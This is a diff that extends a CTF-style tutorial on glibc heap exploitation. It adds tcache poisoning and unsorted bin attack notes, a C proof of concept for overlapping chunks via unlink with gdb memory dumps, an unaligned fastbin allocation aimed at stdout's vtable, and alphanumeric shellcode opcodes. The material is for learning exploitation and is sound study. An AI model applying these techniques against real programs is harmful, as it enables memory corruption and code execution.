@@ -367,11 +367,23 @@ is pushed into tcache.
    P.S. forward pointer points to the 2nd qword of chunk (always 2nd - 3rd
    qwords - allocator's data) but the upper chunk has a "header" which includes
    PREV_SIZE & SIZE fields.
-
+   
+   Only this bin points to the data of next chunk   (offset + 0x10)
+   Other bins points to the header of next chunk    (offset + 0x0)
+   
+   As you can understand, if we can control fd pointer of tcache chunk via uaf primitive
+   we'll can make arbitrary allocation to get arbitrary write primitive.
+   This is a tcache poinsoning technique. In old versions (glibc < 2.32) you could just
+   overwrite fd pointer but in newer versions Save-Linking exist.
+   It means that you also need have a heap leak to shift and xor addresses.
+   And you also must care about counts. 
+   To the moment of arbitrary allocation at the counts with properly size at least one chunk must be.
+   Else glibc allocator just separates top chunk and returns new chunk.
 
 2) FASTBIN - also quick pool to push/pop chunks, but chunks go here only if
    the appropriate bin in the tcache is already full. Range of sizes which can
-   be pushed to fastbin: [0x10 - 0x80]. Also LIFO - cyclic-one-binded list.
+   be pushed to fastbin: [0x20 - 0x80 (inckuding header)]. 
+   Also LIFO - cyclic-one-binded list.
    Also has safe-linking but has no key. Potentially struct for double free
    (fastbin_dup vulnerability) - fastbin doesn't make strict checks unlike
    tcache and just compares the last freed chunk with the required to free
@@ -434,6 +446,8 @@ is pushed into tcache.
 
        'a' will equal 'c' and if we write the safe-linked address to 'a',
        the next allocation will return a chunk at the rewritten address.
+       
+   Read bonus 6.11 to know about unaligned malloc with fastbin sup (before glibc 2.41)
 
 3) MAIN ARENA BINS:
 
@@ -576,6 +590,134 @@ So, we need free chunk with address 0xffed1610 via ptr overwrite.
 After this it will be put into the tcache/fastbin and next allocation returns 0xffed1610.
 To free unsorted bin look at the bonus 6.9
 
+4.6 Unsorted bin attack (glibc < 2.29)
+------------------------------------------------------------------------------
+
+If we can control unsorted bin chunk's "bk" field we can put address of main_arena to arbitrary address.
+All of we need - trigger glibc macro to exclude victim from unsorted and return it or put to small/large bins.
+We can do this because macro has this part :
+
+	bck = victim->bk;  	
+	unsorted_bin(av)->bk = bck;  	
+	bck->fd = unsorted_bin(av);
+	
+And address of main_arena (large positive value) will be put to the rewritten bk + 0x10.
+But the next allocation can crash the process because heap structure was corrupted but IF ONLY chunk returns via malloc
+(unlink when chunk returns to user). 
+In the another context (allocator moves chunk to small/large bins) attack crashes process during the same malloc, 
+because corrupted chunk from small bin will be also checked to valid structure. 
+But allocator will find incorrect size and call malloc_printerr() -> abort().
+
+I used it to rewrite _IO_list_all address to main arena address because smallbins so close to it and
+if freed chunk with payload will be situated at +0x68 offset (_chain field of _IO_file) (small[4]) we can transfer control at all.
+It crashed the process but I already have all what I need to FSOP.
+
+4.7 Overlapping chunks via unlink
+------------------------------------------------------------------------------
+
+Even in modern versions of glibc this vulnerability exist. 
+Concept is do free chunk to unsorted bin to merge it with the prepared upper fake chunk.
+
+According flags for it to work PREV_INUSE of second victim must be zero. We can do this if off-by-one/null or overflow exist.
+And we must do a fake chunk to pass allocator validation of fd/bk ptrs in the first victim. This is a main rule :
+
+	(P->fd->bk == P) && (P->bk->fd == P)
+	
+And our problem is turning to :
+
+	1. leak addresses where pointer to this chunk
+	2. small heap fend-shui
+	3. control of prev_inuse flag via vuln
+	
+When we got address where situate ptr to this chunk we can put this address with offset - 0x18 to the "fd" and with offset - 0x10 to the "bk".
+It will work because "fd" address will be interpreted as chunk structure where "bk" field has offset 3 qwords from the beginning
+and the same logic for "bk" - at this address field with offset 2 qwords will be checked. 
+Also don't forget that unsorted bin ptrs points to the header of the next chunk (mchunkptr) unlike tcache - it's fd points to data (mem).
+Finally, we put size of our fake chunk to "prev_size" field of the second victim and set PREV_SIZE to zero via vuln.
+But be care about sizes. Allocator expects properly chunk strcuture at second victim's address - prev_size.
+
+This is my poc :
+
+	#include <stdlib.h>
+
+	int main() {
+		char* p[8] = {};
+
+		for (int i = 0; i < 9; ++i) { p[i] = malloc(0x80); }
+		
+		/* chunk between last allocated and top chunk to bypass consolidate after free */
+		malloc(0x10);
+
+		for (int i = 0; i < 7; ++i) { free(p[i]); }
+
+		/* HEAP FENG-SHUI VIA LEGITIMATE CHUNK */
+		*(long long*)(p[7]) = 0;
+		*(long long*)(p[7] + 8) = 0x81;
+		*(long long*)(p[7] + 16) = (long long)(&(p[7]) - 3);
+		*(long long*)(p[7] + 24) = (long long)(&(p[7]) - 2);
+
+		/* VULNERABILITY */
+		*(p[8] - 8) &= ~0xf; 
+		*(p[8] - 16) = 0x80; 
+
+		/* trigger */
+		free(p[8]);
+		
+		return 0;
+	}
+	
+And the memory dump :
+
+	Before free() : 
+	
+		0x5555555596f0: 0x0000000000000000      0x0000000000000091 <== legitimate chunk
+		0x555555559700: 0x0000000000000000      0x0000000000000081 <== groomed fake chunk
+		0x555555559710: 0x00007fffffffdbf0      0x00007fffffffdbf8 <== fd & bk 
+					...
+		0x555555559780: 0x0000000000000080      0x0000000000000090
+					...
+		0x555555559810: 0x0000000000000000      0x0000000000000021
+		0x555555559820: 0x0000000000000000      0x0000000000000000
+		0x555555559830: 0x0000000000000000      0x00000000000207d1
+		
+	Let's look at what we have at fd & bk :
+	
+		0x7fffffffdbf0: 0x0000555555559550      0x00005555555595e0
+		0x7fffffffdc00: 0x0000555555559670      0x0000555555559700 <== bk points to P
+		
+		0x7fffffffdbf8: 0x00005555555595e0      0x0000555555559670
+		0x7fffffffdc08: 0x0000555555559700      <== fd points to P
+		
+	And chunk at 0x555555559780 - prev_size :
+	
+		0x555555559700: 0x0000000000000000      0x0000000000000081
+		0x555555559710: 0x00007fffffffdbf0      0x00007fffffffdbf8
+		
+	After free() :
+	
+		0x5555555596f0: 0x0000000000000000      0x0000000000000091
+		0x555555559700: 0x0000000000000000      0x0000000000000111
+		0x555555559710: 0x00007ffff7e15c20      0x00007ffff7e15c20
+					...
+		0x555555559780: 0x0000000000000080      0x0000000000000090
+					...
+		0x555555559810: 0x0000000000000110      0x0000000000000020
+		0x555555559820: 0x0000000000000000      0x0000000000000000
+		0x555555559830: 0x0000000000000000      0x00000000000207d1
+		
+	Here we are. Allocator successfully consolidated our fake chunk (1st victim) with 2nd victim.
+	And prev_inuse & prev_size were set at the last chunk at 0x555555559810. 
+	The next malloc with 0x100 returns 0x555555559710 :
+	
+		gef➤  call (char*)malloc(0x100)
+		$1 = 0x555555559710 " \\\341\367\377\177"
+		
+	Impact of this technique depends on your imagination :)
+	You can make fake chunk not only at the upper chunk. 
+	Better make this with spread to pinch valid chunk beetween victims and probably according a programm logic
+	with a next allocation you can fill that area as whole chunk to overwrite fd & bk of pinched chunk to trigger fastbin/tcache poisoning.
+	Or you can get uaf primitive because 1st victim still not freed for allocator and it opens a way to unsorted bin attack, for example.
+
 ================================================================================
 5. FILE-STREAM ORIENTED PROGRAMMING
 ================================================================================
@@ -715,8 +857,8 @@ When programm uses fclose() it pulls JUMP_FIELD(_IO_close_t, __close) from vtabl
 It means that if we overwrite 18-th dword/qword (depends on i386/amd64 architecture), fclose will pull our address instead of original __close().
 p.s. it maybe pulls JUMP_FIELD(_IO_finish_t, __finish), but according my experience - firstly fclose trigger especially __close().
 
-fread() pulls JUMP_FIELD(_IO_xsgetn_t, __xsgetn). Offset 9-th dword/qword. The same logic, just like fclose, but another offset.
-fwrite() - JUMP_FIELD(_IO_xsputn_t, __xsputn). Offset 8-th.
+read-functions pull JUMP_FIELD(_IO_xsgetn_t, __xsgetn). Offset 9-th dword/qword. The same logic, just like fclose, but another offset.
+write-functions - JUMP_FIELD(_IO_xsputn_t, __xsputn). Offset 8-th.
 
 Another callbacks called from __close, __xsgetn/putn (mostly). 
 That's all what you need to know at the beginning.
@@ -731,7 +873,7 @@ All of these have become a cause of appearing of several following exploitation 
 
 While glibc's absractions are having pointers to callbacks to next level of abstraction, hackers will find a way to pwn it.
 
-2. _IO_str_jumps (I took it's layout from https://github.com/lattera/glibc/blob/master/libio/strfile.h) :
+1. _IO_str_jumps (I took it's layout from https://github.com/lattera/glibc/blob/master/libio/strfile.h) :
 
 	If we are working with string-stream we'll work with special FILE structure :
 	
@@ -1272,6 +1414,124 @@ When checksec shows you :
 	Stripped:   No
 	
 It's a reason to try shellcoding if you can't find another way to pwn it ;)
+
+6.11 Unaligned address of malloc from fastbins
+------------------------------------------------------------------------------
+
+Interesting fact : malloc() must returns address which aligned by 0x10 bytes.
+But I discovered for myself that it's not exactly. 
+So, before glibc 2.41, when fastbin dup don't required movement chunks from fastbins to tcache
+you can make arbitrary allocation if "environment" looks like chunk structure.
+It means that you can substitute "fd" pointer to any address which includes valid "size" field.
+And if you want to get the allocation where you haven't properly structure at aligned address,
+You can use this trick to bypass (fastbin) !prev_size sigabort :
+
+All of we need - memory space where you want to allocate must includes value which we can use as size.
+Don't forget that fastbins chunks fd points to header of another chunk. Unlike fd at tcache.
+Let me show example at FSOP context:
+
+	So, this is a _IO_FILE_plus structure of stdout. And we want to overwrite it's vtable address.
+
+		gef➤  x/30gx 0x7ffff7bc4620
+		0x7ffff7bc4620 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007ffff7bc46a3
+		0x7ffff7bc4630 <_IO_2_1_stdout_+16>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
+		0x7ffff7bc4640 <_IO_2_1_stdout_+32>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
+		0x7ffff7bc4650 <_IO_2_1_stdout_+48>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
+		0x7ffff7bc4660 <_IO_2_1_stdout_+64>:    0x00007ffff7bc46a4      0x0000000000000000
+		0x7ffff7bc4670 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
+		0x7ffff7bc4680 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7bc38e0
+		0x7ffff7bc4690 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
+		0x7ffff7bc46a0 <_IO_2_1_stdout_+128>:   0x000000000a000000      0x00007ffff7bc5780
+		0x7ffff7bc46b0 <_IO_2_1_stdout_+144>:   0xffffffffffffffff      0x0000000000000000
+		0x7ffff7bc46c0 <_IO_2_1_stdout_+160>:   0x00007ffff7bc37a0      0x0000000000000000
+		0x7ffff7bc46d0 <_IO_2_1_stdout_+176>:   0x0000000000000000      0x0000000000000000
+		0x7ffff7bc46e0 <_IO_2_1_stdout_+192>:   0x00000000ffffffff      0x0000000000000000
+		0x7ffff7bc46f0 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007ffff7bc26e0 <== vtable's address
+
+	As you can see, if we want to do this we must do allocation no more at 0x7ffff7bc46f8.
+	Fine, but we have an interesting value at _codecvt field at 0x7ffff7bc46c0. 
+	What if we look at this layout with small "shifting" of target address?
+	
+		gef➤  x/30gx 0x7ffff7bc46bd
+		0x7ffff7bc46bd <_IO_2_1_stdout_+157>:   0xfff7bc37a0000000      0x000000000000007f
+		0x7ffff7bc46cd <_IO_2_1_stdout_+173>:   0x0000000000000000      0x0000000000000000
+		0x7ffff7bc46dd <_IO_2_1_stdout_+189>:   0x00ffffffff000000      0x0000000000000000
+		0x7ffff7bc46ed <_IO_2_1_stdout_+205>:   0x0000000000000000      0xfff7bc26e0000000 <== vtable's address ending
+		0x7ffff7bc46fd <_IO_2_1_stdout_+221>:   0xfff7bc454000007f      <== vtable's address beginning
+
+	So, right at 0x7ffff7bc46bd we have absolutely valid header of chunk with size 0x70 (incliding 0x10 bytes of header)
+	and flags PREV_INUSE | IS_MAPPED | NOT_MAIN_ARENA (0x7f = 0b0b1111111). 
+	If PREV_INUSE set we can have data (of previous chunk)  which overwrite prev_size field of chunk header.
+	
+	And via fastbin dup :
+	
+		0x555555a021c0: 0x0000000000000000      0x0000000000000071
+		0x555555a021d0: 0x00007ffff7bc46bd      0x0000000000000000
+					...
+		0x555555a02260: 0x0000000000000000      0x0000000000000071
+		0x555555a02270: 0x0000555555a02161      0x0000000000000000
+	
+	The next malloc( <0x60 - 0x68> ) returns 0x7ffff7bc46cd which will help us to overwrite vtable pointer of stdout.
+	
+6.12 Unaligned malloc size to potentially off-by-one
+------------------------------------------------------------------------------
+
+When you call malloc(X), X will be aligned to 0x10 bytes and 0x10 bytes will be added to this value and you'll get the "size" field
+But what is a side of alignment? It depends on X. If you put value which has low nibble which less or equal to 0x8,
+allocator will align it downward and you'll get a way to fill "prev_size" field of the next chunk. For example : 
+
+	This is what you can fill with malloc(0x18) :
+		0x603020:       0x0000000000000000      0x0000000000000021
+		0x603030:       0x6161616161616161      0x6161616161616161
+		0x603040:       0x6161616161616161      0x0000000000000101 <== potentially off-by-one
+		
+	If a process does something like "put null byte after reading/copying" (sprintf, strcpy, strdup for example) 
+	you can overwrite "size" field and get a way to reach overlapping chunks or something else (topchunk size control)
+	
+6.13 Polymorphic shellcode
+------------------------------------------------------------------------------
+
+So, I'm not sure that you can be faced with this case at new tasks but I was faced and I can't don't explain it :)
+At the "alive_note" task from pwnable.tw any data sections (including heap) were executable but so strong "firewall" was.
+I can put only "alnum symbols" (english alphabet a-z A-Z and printable digits 0x30-0x31) and space 0x20.
+Btw, exist "death_note" yet where filter passes only printable symbols, but it's more soft.
+It means that I have very small set of opcodes which would help to build shellcode. 
+So, I had to do the polymorphic shellcode which will transforms itself during execution to bypass filter 
+to get such opcodes as pop ebx and int 0x80 and '/bin/sh\x00' at the stack and other useful values.
+In similar case operations like push/pop & inc/dec & xor/end are you best friends.
+
+Here are a couple of my advices :
+
+	1. Use esp to handle the stack via push esp; pop ecx
+	2. Save zeros to set arguments ecx & edx to zero
+	3. Use je/jne if you can put only separated shellcode
+	4. Look around. Already exist opcodes like 0x00 maybe aren't malicious to your shellcode
+	5. You can get almost any value via XOR ([reg + offs] ^ reg)
+	6. Negative values can be useful with XOR (just dec)
+	7. If you have large space to shellcode don't be afraid from a lot "inc"/"dec"
+	8. Via "stack" pointer (ecx) make stack grooming to get what you need
+	9. You must find a something "base" pointer which helps you to XOR opcodes to bypess filter
+	
+Here are some opcodes which are "alnum symbols" :
+
+	50 - push   eax		58 - pop    eax
+	51 - push   ecx		59 - pop    ecx
+	52 - push   edx		5a - pop    edx
+	54 - push   esp
+	
+	49 - dec    ecx		41 - inc    ecx
+	4a - dec    edx		43 - inc    ebx
+	4b - dec    ebx
+	
+	66 31 50 68 - xor    WORD PTR [eax+0x68],dx
+	30 50 41    - xor    BYTE PTR [eax+0x41],dl
+	20 59 41    - and    BYTE PTR [ecx+0x41],bl (if space is valid sym)
+
+	68 5a 5a 73 68 - push   0x68735a5a
+	68 5a 62 69 6e - push   0x6e69625a
+	
+	74 41 - je     + 0x41
+	75 41 - jne    + 0x41
 
 ===================================================================
 And don't forget : "control is an illusion, but a very useful one"
